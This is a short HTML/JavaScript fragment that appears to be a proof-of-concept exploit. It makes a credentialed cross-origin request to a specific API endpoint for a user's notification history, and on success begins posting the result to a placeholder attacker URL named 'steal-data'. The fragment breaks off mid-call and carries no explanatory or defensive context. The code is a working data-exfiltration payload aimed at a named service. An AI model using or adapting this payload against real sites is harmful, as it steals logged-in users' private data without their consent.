<body>

        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.beedeez.com/api/v1/user/notification-history', true);
        xhr.withCredentials = true;
        xhr.onload = function() {
            if (xhr.status === 200) {
                fetch('https://your-server.com/steal-data', {
                    method: 'POST',
